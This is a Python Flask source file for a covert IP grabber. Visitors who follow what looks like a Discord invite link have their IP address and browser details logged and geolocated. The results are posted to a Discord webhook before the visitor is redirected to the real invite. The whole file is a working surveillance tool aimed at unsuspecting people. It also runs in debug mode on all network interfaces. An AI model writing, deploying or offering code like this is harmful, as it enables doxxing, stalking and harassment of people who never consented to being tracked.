'''
Redirects the user and logs their ip
'''
import os
import requests
from threading import Thread
from dotenv import load_dotenv
from flask import Flask, request, redirect
from ua_parser import user_agent_parser
from services.ip_api import IpApi
from services.db_ip import DBIP

load_dotenv()

app = Flask(__name__)
services = (IpApi, DBIP)
INVITE_LINK = os.environ.get('INVITE_LINK')
WEBHOOK_LINK = os.environ.get('WEBHOOK_LINK')


def parse_user_agent(user_agent):
    '''
    Parses the user agent
    ### Returns
    - embed fields containing parsed user agent data
    '''
    ua_parser = user_agent_parser.Parse(user_agent)

    fields = []

    fields.append({
        'name': 'Device',
        'value': f'Brand: {ua_parser["device"].get("brand",)}\nFamily: {ua_parser["device"].get("family")}\nModel: {ua_parser["device"].get("model")}'
    })

    fields.append({
        'name': 'OS',
        'value': f'{ua_parser["os"].get("family")} {ua_parser["os"].get("major")}.{ua_parser["os"].get("minor")}.{ua_parser["os"].get("patch")}'
    })

    fields.append({
        'name': 'Browser',
        'value': f'{ua_parser["user_agent"].get("family")} {ua_parser["user_agent"].get("major")}.{ua_parser["user_agent"].get("minor")}.{ua_parser["user_agent"].get("patch")}'
    })

    return fields


def post_ip(ip_addr, user_agent):
    '''
    Posts the ip to discord
    '''
    ua_embed = {
        'title': 'Invite IP Log',
        'description': f'Invited to {INVITE_LINK}',
        'fields': [
            {
                'name': 'User Agent',
                'value': user_agent
            }
        ]
    }

    try:
        ua_embed['fields'].extend(parse_user_agent(user_agent))
    except Exception as e:
        print('Error while parsing user agent:', e)

    ip_embed = {
        'description': 'IP lookup data',
        'fields': [
            {
                'name': 'IP',
                'value': ip_addr
            }
        ]
    }

    for service in services:
        try:
            ip_embed['fields'].append(service(ip_addr).lookup_ip())
        except Exception as e:
            print(f'Error while looking up ip using {service.__name__}:', e)

    try:
        requests.post(WEBHOOK_LINK, json={'embeds': [ua_embed, ip_embed]}, timeout=10)
    except Exception as e:
        print('Error while posting data:', e)


@app.route('/')
def invite():
    '''
    Logs the visitor's ip, sends it to discord 
    via webhooks and redirects to the invite link
    '''
    if 'HTTP_X_FORWARDED_FOR' in request.environ:
        ip_addr = request.environ['HTTP_X_FORWARDED_FOR']
    elif 'HTTP_X_REAL_IP' in request.environ:
        ip_addr = request.environ['HTTP_X_REAL_IP']
    else:
        ip_addr = request.remote_addr

    Thread(target=post_ip, args=(
        ip_addr, request.headers.get('User-Agent'))).start()

    return redirect(INVITE_LINK)


if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0')
